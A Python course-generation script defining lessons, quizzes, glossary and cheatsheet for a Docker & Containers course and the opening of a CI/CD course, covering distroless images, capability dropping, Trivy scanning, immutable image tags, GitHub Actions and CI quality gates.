                "<ul><li><strong>1. Distroless Base Images (Google):</strong> <code>gcr.io/distroless/python3</code> contains only Python and essential C-libraries. No `/bin/sh`, no `apt`, no `wget`. If an attacker exploits a code vulnerability, they cannot launch a shell or download binaries!</li><li><strong>2. Dropping Linux Kernel Capabilities (`--cap-drop ALL`):</strong> By default, Linux containers possess capabilities like `CAP_CHOWN` and `CAP_NET_RAW`. Dropping all capabilities and adding back only what is needed prevents container escape exploits: <code>--cap-drop ALL --cap-add NET_BIND_SERVICE</code>.</li><li><strong>3. Automated Vulnerability Scanning in CI (Trivy / Docker Scout):</strong> Scan container images in GitHub Actions before pushing to production registries. Trivy scans OS packages and Python wheels against CVE databases, blocking images with Critical vulnerabilities!</li></ul>",
                "<pre><code># Running an Automated Container Security Scan with Trivy in CI:\n# (GitHub Actions step)\n- name: Scan Image for Vulnerabilities\n  uses: aquasecurity/trivy-action@master\n  with:\n    image-ref: 'company/production-api:latest'\n    format: 'table'\n    exit-code: '1' # Fails the build if CRITICAL vulnerabilities exist!\n    severity: 'CRITICAL,HIGH'</code></pre>",
                "<div class=\"callout\"><p><strong>The Distroless Rule:</strong> If an application does not need a shell to run in production, do not include a shell in the container. Attackers cannot spawn what does not exist.</p></div>"
            ],
            "Standard Ubuntu vs Distroless Image", "Heavy attack surface vs pure runtime minimalism",
            [
                {"title": "Standard Ubuntu Image (Vulnerable)", "lines": ["Includes bash, sh, apt, curl, python", "Size: 600MB+ | 40+ known CVEs", "Attacker can download and run rootkits"]},
                {"title": "Google Distroless Image (Hardened)", "lines": ["Contains ONLY python binary and app code", "Zero shells (/bin/sh deleted!), zero apt", "Size: 50MB | Near-zero CVEs | Shell exploits fail!"]}
            ],
            "Linux Capabilities Hardening", "Dropping kernel superpowers",
            [
                {"title": "--cap-drop ALL", "lines": ["Drops root capabilities from container process", "Prevents network sniffing & kernel tampering"]},
                {"title": "--cap-add NET_BIND_SERVICE", "lines": ["Grants strictly the single capability needed"]}
            ],
            "Complete the container hardening sentence",
            "Google {1} container images contain zero shells and package managers to defeat attackers, while automated {2} scans block images with critical CVEs in CI.",
            [
                {"answer": "distroless", "hint": "Images containing only runtime without OS utilities", "options": ["distroless", "formatting", "licensing"]},
                {"answer": "Trivy", "hint": "Open-source container vulnerability scanner", "options": ["Trivy", "Photoshop", "Excel"]}
            ],
            [
                {"q": "What happens if an attacker achieves Remote Code Execution (RCE) in a Distroless container image?",
                 "a": ["The attacker cannot spawn an interactive shell (e.g. /bin/bash or /bin/sh) or download external malware tools because no shells or package managers exist in the image", "The host computer shuts down", "The attacker gains root access immediately", "The container deletes the internet"],
                 "c": 0, "why": "Distroless images lack shells and package managers, preventing attackers from spawning interactive shell sessions."},
                {"q": "What open-source tool is the industry standard for scanning container images for vulnerabilities in CI/CD pipelines?",
                 "a": ["Trivy (by Aqua Security)", "Git", "React", "WordPress"],
                 "c": 0, "why": "Trivy is a fast, comprehensive security scanner for container images, filesystems, and Git repositories."},
                {"q": "What does the '--cap-drop ALL' Docker flag do?",
                 "a": ["It revokes all default Linux root capabilities (like raw packet creation or ownership modifications) from the container's processes", "It makes the container run in all-caps", "It deletes all files", "It turns off the CPU"],
                 "c": 0, "why": "--cap-drop ALL removes all discretionary kernel capabilities, strictly confining container privileges."},
                {"q": "Why is scanning third-party base images (like python:3.12 or node:20) necessary before using them in production?",
                 "a": ["Upstream base images regularly accumulate unpatched operating system vulnerabilities (CVEs) that must be updated or patched", "Base images expire after 30 days", "Base images are copyright protected", "It is required by Python syntax"],
                 "c": 0, "why": "Regular scanning ensures that upstream base image vulnerabilities are caught and updated promptly."}
            ],
            "You know how to harden container images using distroless bases, capability dropping, and automated Trivy scanning.",
            "Packaging and Deploying a Production Containerized Service", "Synthesize everything: build, harden, test, and deploy a containerized service."
        ),
        build_lesson(
            8, "packaging-deploying-production-container", "Packaging and Deploying a Production Containerized Service", "Container Deployment",
            "Synthesizing containerization: building production images, passing automated Trivy gates, and deploying to cloud registries and runners.",
            "What complete sequence of operations defines a production-grade container release pipeline?",
            ["Multi-stage build, non-root user enforcement, automated vulnerability scanning with Trivy, image signing, and deployment to a container registry", "Writing code in Notepad and uploading to FTP", "Sending Dockerfiles via email", "Running containers without building images"],
            0, "Production release pipelines build lean multi-stage images, enforce non-root security, scan for CVEs, and publish to registries.",
            [
                "<p>We have covered the complete engineering discipline of Docker & Containers: kernel namespaces and cgroups, Union File System layer caching, production multi-stage Dockerfiles, non-root users, container networking and DNS, persistent storage volumes, multi-container Docker Compose, and distroless hardening.</p>",
                "<p>Now, we synthesize these into an <strong>End-to-End Production Container Pipeline</strong>:</p>",
                "<ul><li><strong>1. Build Multi-Stage Hardened Image:</strong> Compile dependencies in a builder stage; assemble final runtime on an unprivileged `USER 1000` base with `.dockerignore` pruning.</li><li><strong>2. Automated Security Verification (Trivy):</strong> Scan image in CI/CD. Fail build if any High/Critical CVE is discovered.</li><li><strong>3. Multi-Service Validation (Docker Compose):</strong> Execute integration test suite across web, database, and Redis services using `compose.yaml` with healthcheck gates.</li><li><strong>4. Tagging & Registry Push:</strong> Tag with immutable git SHA (e.g. `company/api:a849f2b`) and push to AWS ECR or GitHub Container Registry (GHCR). <em>Never rely on mutable `latest` tags in production!</em></li></ul>",
                "<pre><code># The Complete Production Deployment Script (deploy.sh):\n# 1. Build hardened production image with git SHA tag:\nCOMMIT_SHA=$(git rev-parse --short HEAD)\nIMAGE_URI=\"ghcr.io/company/prod-service:${COMMIT_SHA}\"\n\ndocker build -t \"$IMAGE_URI\" .\n\n# 2. Automated Vulnerability Gate\ntrivy image --exit-code 1 --severity CRITICAL \"$IMAGE_URI\"\n\n# 3. Push immutable versioned image to Container Registry\ndocker push \"$IMAGE_URI\"\n\n# 4. Deploy to Kubernetes / ECS cluster with zero downtime!\necho \"Successfully published $IMAGE_URI to production registry!\"</code></pre>",
                "<div class=\"callout\"><p><strong>The Immutable Tag Law:</strong> Never deploy `:latest` to production. Always deploy immutable tags pinned to the git commit SHA. If an issue occurs, you can roll back instantly to the exact prior commit.</p></div>"
            ],
            "The Production Container Release Pipeline", "From source code to immutable registry artifact",
            [
                {"title": "1. Multi-Stage Build", "lines": ["Prunes build tools, runs as non-root", "Leaves zero dev dependencies behind"]},
                {"title": "2. Trivy Security Gate", "lines": ["Scans for CVEs in CI pipeline", "Exits code 1 on Critical vulnerabilities"]},
                {"title": "3. Push to GHCR / ECR", "lines": ["Tagged with immutable git commit SHA", "Published to production cloud registry"]},
                {"title": "4. Rolling Cloud Deploy", "lines": ["ECS / Kubernetes pulls verified image", "Zero-downtime rolling update!"]}
            ],
            "The Power of Immutable Git SHA Tags", "Guaranteed rollback precision",
            [
                {"title": "Deploying :latest (Brittle)", "lines": ["Overwrites previous versions", "Rollback is impossible without rebuilding"]},
                {"title": "Deploying :a849f2 (Deterministic)", "lines": ["Permanent historical artifact", "Instant one-second rollback to previous SHA"]}
            ],
            "Complete the container deployment sentence",
            "Production container pipelines build multi-stage images, verify security with automated {1} scans, and deploy using immutable {2} commit SHA tags.",
            [
                {"answer": "vulnerability", "hint": "CVE security testing", "options": ["vulnerability", "formatting", "licensing"]},
                {"answer": "git", "hint": "Version control commit hash", "options": ["git", "hardware", "monitors"]}
            ],
            [
                {"q": "Why is deploying Docker images tagged as ':latest' considered an enterprise anti-pattern?",
                 "a": ["':latest' is a mutable tag that can change unexpectedly, making deployments non-reproducible and rollback to exact prior versions impossible", "':latest' is illegal in Kubernetes", "':latest' makes images 10x larger", "Docker deletes ':latest' images"],
                 "c": 0, "why": "Mutable ':latest' tags break reproducibility and prevent instant, reliable rollbacks."},
                {"q": "What is an 'Image Registry' (like AWS ECR, Docker Hub, or GitHub Container Registry)?",
                 "a": ["A secure, centralized cloud storage service where versioned Docker image artifacts are stored, cataloged, and pulled by production clusters", "A list of computer names", "A website for buying domains", "A database query optimizer"],
                 "c": 0, "why": "Container registries act as the central distribution hub for versioned container images."},
                {"q": "How does a healthcheck instruction in a Dockerfile or Compose file enable zero-downtime rolling deployments in Kubernetes?",
                 "a": ["The orchestrator waits for the new container's healthcheck to pass before terminating the old container, ensuring uninterrupted service for users", "It turns off the old container immediately", "It deletes the database", "It makes servers run for free"],
                 "c": 0, "why": "Healthchecks ensure that incoming traffic is only routed to newly spawned containers once they are fully initialized."},
                {"q": "What is the ultimate mark of an expert DevOps and container engineer?",
                 "a": ["Authoring minimal, secure, non-root multi-stage containers that build fast via layer caching and deploy reliably via immutable pipelines", "Writing 1,000-line Dockerfiles", "Running all containers as root to avoid errors", "Deploying code without testing"],
                 "c": 0, "why": "Minimal size, non-root execution, fast caching, and immutable tagging define container craftsmanship."}
            ],
            "You have completed the Docker & Containers course.",
            "Next Course: CI/CD & Automated Deployment", "Explore continuous integration, GitHub Actions workflows, matrix testing, artifacts, and canary deployments."
        )
    ]

    glossary = [
        {"id": "containers-basics", "title": "Containers & Layers", "terms": [
            {"term": "Docker Container", "def": "A lightweight, standalone, executable package of software including code, runtime, system tools, and libraries.", "lesson": 1, "tags": ["containers", "docker"]},
            {"term": "Linux Namespaces", "def": "Kernel features providing isolated workspace environments (process, network, mounts) for containers.", "lesson": 1, "tags": ["kernel", "isolation"]},
            {"term": "OverlayFS", "def": "A Union File System that merges multiple read-only image layers with an active writable container layer.", "lesson": 2, "tags": ["filesystem", "layers"]}
        ]},
        {"id": "dockerfiles", "title": "Dockerfiles & Hardening", "terms": [
            {"term": "Multi-Stage Build", "def": "A Dockerfile pattern separating build-time compilers from the final lean runtime image to shrink size and CVEs.", "lesson": 3, "tags": ["dockerfile", "builds"]},
            {"term": "Non-Root Execution", "def": "Running container processes under an unprivileged user (UID 1000) rather than root to limit exploit blast radius.", "lesson": 3, "tags": ["security", "hardening"]},
            {"term": "Distroless", "def": "Minimal container images containing only the application and runtime, with zero shells, package managers, or OS tools.", "lesson": 7, "tags": ["security", "distroless"]}
        ]},
        {"id": "networking-storage", "title": "Networking & Storage", "terms": [
            {"term": "User-Defined Bridge", "def": "A private internal virtual network providing automatic container DNS resolution by service name.", "lesson": 4, "tags": ["networking", "dns"]},
            {"term": "Named Volume", "def": "A Docker-managed persistent storage pool decoupled from container lifecycles, ideal for production databases.", "lesson": 5, "tags": ["storage", "volumes"]},
            {"term": "Bind Mount", "def": "Mounting a specific host computer directory directly into a container, ideal for local code hot-reloading.", "lesson": 5, "tags": ["storage", "mounts"]}
        ]},
        {"id": "compose-scanning", "title": "Compose & Scanning", "terms": [
            {"term": "Docker Compose", "def": "A declarative tool for defining and orchestrating multi-container application stacks via compose.yaml.", "lesson": 6, "tags": ["orchestration", "compose"]},
            {"term": "Trivy", "def": "A leading open-source security scanner detecting vulnerabilities (CVEs) and misconfigurations in container images.", "lesson": 7, "tags": ["security", "trivy"]},
            {"term": "Immutable Git SHA Tag", "def": "Tagging container images with the exact commit hash (e.g. :a849f2) to guarantee deterministic rollbacks.", "lesson": 8, "tags": ["devops", "deploy"]}
        ]}
    ]

    cheatsheet = [
        {
            "title": "Production Multi-Stage Python Dockerfile",
            "label": "Lean, non-root production pattern",
            "code": "FROM python:3.12-slim AS builder\nWORKDIR /build\nCOPY requirements.txt .\nRUN pip wheel --no-cache-dir --wheel-dir=/build/wheels -r requirements.txt\n\nFROM python:3.12-slim\nWORKDIR /app\nRUN useradd -u 1000 appuser\nCOPY --from=builder /build/wheels /wheels\nRUN pip install --no-cache /wheels/* && rm -rf /wheels\nCOPY --chown=appuser:appuser . .\nUSER appuser\nCMD [\"python\", \"main.py\"]",
            "lessonN": 3, "lessonSlug": "production-dockerfiles-multistage-nonroot", "lessonTitle": "Writing Production Dockerfiles: Multi-Stage Builds & Non-Root Users"
        },
        {
            "title": "Docker Compose with Service Healthcheck",
            "label": "Declarative stack orchestration",
            "code": "services:\n  api:\n    build: .\n    ports: [\"8000:8000\"]\n    depends_on:\n      db: { condition: service_healthy }\n  db:\n    image: postgres:16-alpine\n    volumes: [pgdata:/var/lib/postgresql/data]\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\nvolumes:\n  pgdata:",
            "lessonN": 6, "lessonSlug": "multi-container-docker-compose", "lessonTitle": "Multi-Container Orchestration with Docker Compose"
        },
        {
            "title": "Automated Trivy Container Security Scan",
            "label": "Blocking critical CVEs in CI",
            "code": "# Scan image and exit 1 if Critical vulnerabilities found:\ntrivy image --exit-code 1 --severity CRITICAL company/api:latest",
            "lessonN": 7, "lessonSlug": "container-security-distroless-scanning", "lessonTitle": "Container Security Hardening: Distroless, Capabilities, and Scanning"
        },
        {
            "title": "Isolated Docker Run Command",
            "label": "Hardened container execution",
            "code": "docker run --rm -i \\\n    --network none \\\n    --read-only \\\n    --tmpfs /tmp:rw,size=64m \\\n    --user 1000:1000 \\\n    --cap-drop ALL \\\n    python:3.12-slim python app.py",
            "lessonN": 7, "lessonSlug": "container-security-distroless-scanning", "lessonTitle": "Container Security Hardening: Distroless, Capabilities, and Scanning"
        }
    ]

    course_data = {
        "id": "docker-containers",
        "title": "Docker & Containers",
        "num": 96,
        "emoji": "🐳",
        "desc": "Images, containers, volumes and compose — packaging software so it runs the same everywhere.",
        "topics": ["Docker", "Containers", "Union File System", "Layer Caching", "Multi-Stage Builds", "Networking & DNS", "Volumes", "Docker Compose", "Distroless", "Trivy"],
        "mission": "# Mission — Docker & Containers\n\nMaster the art of containerization with Docker. Understand Linux namespaces and cgroups, optimize Union File System layer caching to slash build times, write secure multi-stage Dockerfiles running as unprivileged non-root users, architect inter-container networks with embedded DNS, persist database state with Named Volumes and bind mounts, orchestrate multi-tier stacks with Docker Compose healthchecks, harden containers using distroless images and capability dropping, and deploy immutable container artifacts.",
        "notes": "# Notes — Docker & Containers\n\nOrder Dockerfile instructions from least-to-most frequently changing. Never run production containers as root. Use multi-stage builds to eliminate compilers, and deploy immutable git SHA tags.",
        "resources": "# Resources — Docker & Containers\n\n- Docker Documentation, *Dockerfile Best Practices Guide*\n- GoogleContainerTools, *Distroless Container Images*\n- Aqua Security, *Trivy Vulnerability Scanner Reference*",
        "glossaryGroups": glossary,
        "cheatsheetSections": cheatsheet,
        "lessons": lessons
    }
    save_course(course_data)

# ==============================================================================
# COURSE 97: ci-cd (CI/CD & Automated Deployment)
# ==============================================================================
def make_course_97():
    lessons = [
        build_lesson(
            1, "philosophy-continuous-delivery", "The Philosophy of Continuous Delivery: Ship Small, Ship Often", "CD Philosophy",
            "The cultural and technical evolution of software release: big-bang deployments vs small batches, trunk-based development, and lead time.",
            "What is the primary philosophical shift introduced by Continuous Delivery (CD)?",
            ["Replacing high-risk, infrequent 'big-bang' quarterly releases with small, automated, daily incremental deployments to minimize risk and accelerate feedback", "Never testing software before shipping", "Writing code without version control", "Shipping software exclusively on USB drives"],
            0, "Continuous Delivery reduces risk by shipping small, frequent, automated changes continuously into production.",
            [
                "<p>Decades ago, software companies released updates once every 6 months. Teams spent three weeks manually regression testing, followed by an all-hands midnight release where <strong>dozens of conflicting changes were pushed at once</strong>. If anything went wrong, finding which of the 500 commits broke the system took days of stressful firefighting.</p>",
                "<p><strong>Continuous Integration and Continuous Delivery (CI/CD)</strong> transforms deployment from an agonizing ritual into a routine, boring background process:</p>",
                "<ul><li><strong>1. Small Batch Sizes:</strong> Merge 50 lines of code every day instead of 5,000 lines once a month. Small batches have tiny blast radiuses and are trivial to review, test, and roll back!</li><li><strong>2. Continuous Integration (CI):</strong> Every time an engineer commits to a branch, an automated runner checks out the code, installs dependencies, runs linters, and executes the automated test suite. Regressions are caught in <strong>minutes</strong>, while the code is fresh in the author's mind!</li><li><strong>3. Trunk-Based Development:</strong> Engineers merge short-lived feature branches back into `main` multiple times a day, eliminating dreaded 'merge hell' across long-lived branches.</li><li><strong>4. The DORA Metrics:</strong> High-performing engineering teams measure four key metrics: <em>Deployment Frequency</em>, <em>Lead Time for Changes</em>, <em>Change Failure Rate</em>, and <em>Time to Restore Service</em>.</li></ul>",
                "<pre><code># The DORA Benchmark for Elite Engineering Teams:\n# - Deployment Frequency:    Multiple times per day (Automated)\n# - Lead Time for Changes:   Less than 1 hour (Commit to Production)\n# - Change Failure Rate:     0% - 15% (Strict CI gates prevent broken code)\n# - Time to Restore Service: Less than 15 minutes (Instant automated rollback)</code></pre>",
                "<div class=\"callout\"><p><strong>The Golden CD Axiom:</strong> If something is painful, do it more often. Deploying daily forces you to automate testing, build pipelines, and release gates until shipping is effortless.</p></div>"
            ],
            "Big-Bang Releases vs Continuous Delivery", "High-risk quarterly dumps vs safe daily increments",
            [
                {"title": "Legacy Big-Bang (High Risk)", "lines": ["6 months of accumulated changes", "Midnight panic releases, painful rollbacks", "High blast radius across the business"]},
                {"title": "Continuous Delivery (Low Risk)", "lines": ["Small, focused daily commits", "Automated CI testing gates on every PR", "Routine, boring, zero-downtime releases"]}
            ],
            "The Core DORA Metrics", "Measuring engineering delivery velocity",
            [
                {"title": "Deployment Frequency", "lines": ["How often code ships to production (Elite: Daily)"]},
                {"title": "Lead Time for Changes", "lines": ["Time from commit to running in prod (Elite: < 1 hr)"]},
                {"title": "Time to Restore", "lines": ["Time to recover from an incident (Elite: < 15 mins)"]}
            ],
            "Complete the CD philosophy sentence",
            "Continuous Delivery minimizes deployment risk by replacing high-risk big-bang releases with small, automated {1} that ship to production multiple times per {2}.",
            [
                {"answer": "batches", "hint": "Small incremental units of work", "options": ["batches", "keyboards", "monitors"]},
                {"answer": "day", "hint": "Daily frequency", "options": ["day", "century", "decade"]}
            ],
            [
                {"q": "Why is deploying small, frequent batches inherently safer than deploying large quarterly releases?",
                 "a": ["Small changes have a tiny blast radius; if a bug slips through, it is immediately obvious which specific commit caused it, making rollbacks fast and simple", "Small batches use less electricity", "Large releases run faster in production", "Small batches are required by Python"],
                 "c": 0, "why": "Small changes isolate variables, simplifying root-cause analysis and instant rollbacks."},
                {"q": "What is 'Trunk-Based Development'?",
                 "a": ["A branching strategy where developers merge small, short-lived feature branches into the main trunk frequently, avoiding long-lived merge conflicts", "Developing software on tree trunks", "Using one single file for all code", "A method for organizing computer cables"],
                 "c": 0, "why": "Trunk-based development merges small branches daily, preventing massive branch divergence."},
                {"q": "What do the DORA (DevOps Research and Assessment) metrics measure in an engineering organization?",
                 "a": ["Software delivery throughput and operational stability (Deployment Frequency, Lead Time, Failure Rate, Recovery Time)", "The typing speed of developers", "How many hours employees spend in meetings", "The cost of office furniture"],
                 "c": 0, "why": "DORA metrics provide the definitive empirical benchmark for software delivery performance."},
                {"q": "What role does automated testing play in Continuous Integration?",
                 "a": ["It acts as a safety gate that automatically proves code correctness on every pull request, preventing regressions from merging into the main branch", "It writes documentation automatically", "It makes servers run for free", "It replaces the need for developers"],
                 "c": 0, "why": "Automated test suites catch regressions continuously before code reaches production branches."}
            ],
            "You understand the philosophy of Continuous Delivery, small batch sizes, and DORA metrics.",
            "GitHub Actions Core Concepts: Workflows, Jobs, and Steps", "Master GitHub Actions syntax, runner execution, and event triggers."
        ),
        build_lesson(
            2, "github-actions-core-concepts", "GitHub Actions Core Concepts: Workflows, Jobs, and Steps", "GitHub Actions",
            "Inside GitHub Actions: YAML workflow schemas (`.github/workflows/`), triggers (`on: push, pull_request`), runners, jobs, and steps.",
            "What is the hierarchy of execution units in a GitHub Actions workflow?",
            ["A Workflow contains one or more parallel Jobs; each Job runs on an isolated Runner and executes a sequence of sequential Steps", "Steps contain Jobs, which contain Workflows", "Workflows run on the user's laptop", "Jobs only run on Saturdays"],
            0, "Workflows orchestrate Jobs (running on distinct virtual runners), which in turn execute sequential Steps.",
            [
                "<p>GitHub Actions is the premier cloud-native CI/CD automation engine. It allows developers to define automated workflows that trigger on any GitHub event (pull request, push, issue creation, release tag). Workflows are defined declaratively in YAML files placed under <code>.github/workflows/</code>.</p>",
                "<p>The Anatomy of a GitHub Actions Workflow:</p>",
                "<ul><li><strong>1. Workflows:</strong> The top-level automated process defined in a `.yml` file. Governed by <strong>Triggers</strong>: <code>on: [push, pull_request]</code>.</li><li><strong>2. Jobs:</strong> Independent units of work running on separate virtual machines (Runners, e.g. `runs-on: ubuntu-latest`). By default, <strong>Jobs run in parallel!</strong> Use `needs: [job_a]` to define sequential dependencies.</li><li><strong>3. Steps:</strong> Sequential tasks executed inside a single Job's runner. Steps can run shell scripts (`run: pytest`) or invoke pre-built community actions (`uses: actions/checkout@v4`).</li><li><strong>4. Environment & Secrets:</strong> Securely inject API keys and cloud credentials using repository secrets: <code>${{ secrets.PROD_API_KEY }}</code>.</li></ul>",
                "<pre><code># Complete Production CI Workflow (.github/workflows/ci.yml):\nname: Continuous Integration\non:\n  pull_request:\n    branches: [main]\n\njobs:\n  test-and-lint:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repository code\n        uses: actions/checkout@v4\n\n      - name: Set up Python 3.12\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.12\"\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install -r requirements.txt\n\n      - name: Execute automated test suite\n        run: pytest --maxfail=1 -v</code></pre>",
                "<div class=\"callout\"><p><strong>The Parallel Job Secret:</strong> Because Jobs run in parallel on separate runners, split your linting, unit tests, and security scans into distinct jobs to execute them concurrently!</p></div>"
            ],
            "GitHub Actions Execution Hierarchy", "Workflows -> Jobs -> Steps",
            [
                {"title": "1. Workflow (.yml)", "lines": ["Triggered on: push to main / pull_request", "Orchestrates top-level pipeline"]},
                {"title": "2. Parallel Jobs (ubuntu-latest)", "lines": ["Job A: Lint & Formatting (Ruff)", "Job B: Unit Tests (pytest)", "Run concurrently on separate VMs!"]},
                {"title": "3. Sequential Steps", "lines": ["Step 1: actions/checkout@v4", "Step 2: setup-python@v5", "Step 3: run: pytest"]}
            ],
            "Job Dependency Chaining", "Using 'needs:' for sequential stages",
            [
                {"title": "Job 1: Test & Lint", "lines": ["Runs first. Must exit code 0"]},
                {"title": "Job 2: Deploy to Staging", "lines": ["needs: [test-and-lint]", "Only executes if Job 1 passes!"]}
            ],
            "Complete the GitHub Actions sentence",
            "GitHub Actions workflows run on event triggers, executing parallel {1} across isolated virtual machines that execute sequential {2} of code and actions.",
            [
                {"answer": "jobs", "hint": "Independent computational units running on VMs", "options": ["jobs", "keyboards", "monitors"]},
                {"answer": "steps", "hint": "Sequential commands or actions inside a job", "options": ["steps", "formatting", "licensing"]}
            ],
            [
                {"q": "What directory must GitHub Actions workflow YAML files be stored in within a Git repository?",
                 "a": [".github/workflows/", ".git/actions/", "/etc/github/", "/workflows/"],
                 "c": 0, "why": "GitHub specifically parses workflow configuration files located in the .github/workflows directory."},
                {"q": "By default, do multiple jobs defined inside the same GitHub Actions workflow run sequentially or in parallel?",
                 "a": ["In parallel on separate virtual runner instances, unless explicit dependencies are defined using the 'needs' keyword", "Sequentially one after another", "Only one job can ever run", "In alphabetical order"],
                 "c": 0, "why": "GitHub Actions executes jobs concurrently by default to minimize total pipeline duration."},
                {"q": "What does the action 'actions/checkout@v4' do inside a workflow step?",
                 "a": ["It clones the repository code into the runner's workspace so subsequent steps can access and test the project files", "It checks out a library book", "It logs out of GitHub", "It pays for GitHub servers"],
                 "c": 0, "why": "actions/checkout clones the current Git repository into the runner environment."},
                {"q": "How can you securely pass a third-party API key to a GitHub Actions step without hardcoding it in YAML?",
                 "a": ["Store the credential in GitHub Repository Secrets and reference it via '${{ secrets.MY_SECRET_KEY }}'", "Type the secret into a public commit message", "Save it in a public text file in the repo", "Email the secret to GitHub support"],
                 "c": 0, "why": "Repository secrets encrypt sensitive credentials and inject them securely into ephemeral runner environments."}
            ],
            "You know how to author and configure GitHub Actions workflows, jobs, steps, and triggers.",
            "Automated Testing & Linting Gates in CI", "Enforce strict quality gates that block defective code from merging."
        ),
        build_lesson(
            3, "automated-testing-linting-gates", "Automated Testing & Linting Gates in CI", "CI Quality Gates",
            "Gating code quality: linters (Ruff, ESLint), type checkers (MyPy, Pyright), test runners (pytest), and GitHub Branch Protection Rules.",
            "Why should an engineering team enforce 'Branch Protection Rules' in GitHub requiring CI checks to pass before merging?",
            ["To mathematically guarantee that no broken code, syntax error, or failing test can ever be merged into the production branch", "To slow down engineering velocity", "To charge developers for pull requests", "It is required by the computer operating system"],
            0, "Branch protection rules enforce that PRs must pass automated CI quality gates before code can be merged.",
            [
                "<p>Code reviews by human engineers are vital for architecture, readability, and design. But human reviewers should <strong>never spend time checking for missing semicolons, unused imports, or broken formatting</strong>. Automated CI gates handle trivial mechanical verification in seconds.</p>",
                "<p>The Four Automated CI Quality Gates:</p>",
                "<ul><li><strong>1. Code Formatting & Linting Gate (Ruff / Black):</strong> Verifies that code conforms to formatting standards in under 1 second. Fast feedback on stylistic consistency!</li><li><strong>2. Static Type Checking Gate (MyPy / Pyright):</strong> Proves type safety across function calls, return types, and schema boundaries without executing the code.</li><li><strong>3. Automated Unit & Integration Tests (pytest / Vitest):</strong> Executes hundreds of test cases covering edge cases, business logic, and error handlers. Must exit with code 0!</li><li><strong>4. GitHub Branch Protection:</strong> Protect `main`! Require: <em>1. Pull Request required before merging</em>, <em>2. Require status checks to pass (test-and-lint)</em>, <em>3. Require at least 1 approved code review</em>.</li></ul>",
                "<pre><code># The Complete CI Quality Gate Step Sequence:\n      - name: Run Linter (Ruff)\n        run: ruff check . # Fast: 0.2s\n\n      - name: Verify Code Formatting (Ruff Format)\n        run: ruff format --check .\n\n      - name: Static Type Checking (Pyright / MyPy)\n        run: pyright src/\n\n      - name: Execute Pytest Suite with Coverage Gate\n        run: pytest --cov=src --cov-fail-under=85 # Blocks PR if test coverage < 85%!</code></pre>",
                "<div class=\"callout\"><p><strong>The Gatekeeper Rule:</strong> If the CI build is red, the pull request cannot be merged. Zero exceptions, zero bypasses. A green build is the minimum entry price for production.</p></div>"
            ],
            "The Four Automated CI Quality Gates", "Sequential validation before merge",
            [
                {"title": "Gate 1: Lint & Format (Ruff)", "lines": ["Checks syntax & style in 0.2s", "Zero bike-shedding in PR reviews"]},
                {"title": "Gate 2: Static Types (Pyright)", "lines": ["Proves type safety across functions", "Catches NoneType bugs at compile time"]},
                {"title": "Gate 3: Unit Tests (pytest)", "lines": ["Executes full test suite", "Enforces 85%+ code coverage threshold"]},
                {"title": "Gate 4: Branch Protection", "lines": ["GitHub blocks the 'Merge' button", "Strictly requires all 3 checks to be GREEN!"]}
            ],
            "Human Review vs Machine Verification", "Freeing human cognitive bandwidth",
            [
                {"title": "What Machines Check (CI)", "lines": ["Formatting, types, syntax, test regressions"]},
                {"title": "What Humans Review", "lines": ["Architecture, business logic, UX, security design"]}
            ],
            "Complete the CI quality gates sentence",
            "CI pipelines enforce automated quality gates using linters, type checkers, and test suites, backed by GitHub branch {1} rules to block failing code from {2}.",
            [
                {"answer": "protection", "hint": "Repository settings guarding branches", "options": ["protection", "formatting", "licensing"]},
                {"answer": "merging", "hint": "Integrating pull requests into main", "options": ["merging", "compilation", "hardware"]}
            ],
            [
                {"q": "What happens in GitHub when a status check fails on a pull request protected by Branch Protection Rules?",
                 "a": ["The 'Merge' button is disabled, physically preventing any engineer from merging the failing code into the protected branch", "The pull request is automatically deleted", "The developer's account is suspended", "The computer restarts"],
                 "c": 0, "why": "Branch protection rules enforce that all status checks must pass before merging is permitted."},
                {"q": "Why is 'Ruff' widely adopted as the modern linter and formatter for Python CI pipelines?",
                 "a": ["Written in Rust, Ruff executes 10x to 100x faster than legacy Python linters (Flake8, Black), finishing in milliseconds in CI", "Ruff writes code automatically", "Ruff replaces Python with C", "Ruff eliminates the need for tests"],
                 "c": 0, "why": "Ruff's extreme speed slashes CI feedback loops from minutes to fractions of a second."},
                {"q": "What does a test coverage gate like '--cov-fail-under=85' enforce?",
                 "a": ["The test runner fails the CI build if the automated tests execute less than 85% of the codebase's statements", "It checks if the computer has 85% battery", "It requires 85 developers to approve", "It runs 85 tests only"],
                 "c": 0, "why": "Coverage gates ensure new code includes corresponding automated tests before merging."},
                {"q": "Why is automating formatting checks in CI superior to discussing code style in human pull request reviews?",
                 "a": ["It eliminates subjective debates and interpersonal friction over stylistic choices, allowing human reviewers to focus on architecture and logic", "Humans cannot see code formatting", "Style guides are illegal in Git", "It makes servers run for free"],
                 "c": 0, "why": "Automating stylistic rules frees human reviewers to focus on business logic and architecture."}
            ],
            "You know how to enforce automated linting, typing, test gates, and branch protection rules.",
            "Matrix Builds and Cross-Platform Testing", "Test code across multiple Python versions and operating systems in parallel."
        ),
        build_lesson(
            4, "matrix-builds-cross-platform-testing", "Matrix Builds and Cross-Platform Testing", "Matrix Builds",
            "Scaling test coverage: the matrix strategy (`strategy.matrix`), cross-version testing (Python 3.10, 3.11, 3.12), and multi-OS runners.",
            "What is a 'Matrix Build' in GitHub Actions?",
            ["A configuration strategy that automatically duplicates a single job definition across a matrix of multiple operating systems and language versions in parallel", "A movie about virtual reality", "A mathematical array calculation tool", "A method for encrypting code"],
            0, "Matrix builds run a single job across permutations of OSs and runtimes (e.g. Ubuntu, Windows, macOS x Python 3.10, 3.11, 3.12).",
            [
                "<p>If you build an open-source library, a CLI tool, or an enterprise SDK, your users don't all run Python 3.12 on Ubuntu. Some run Python 3.10 on Windows; others run Python 3.11 on macOS. How do you guarantee your code works across all of them without writing 9 separate workflow files? <strong>You use a Matrix Build</strong>.</p>",
                "<p>How the GitHub Actions Matrix Strategy works:</p>",
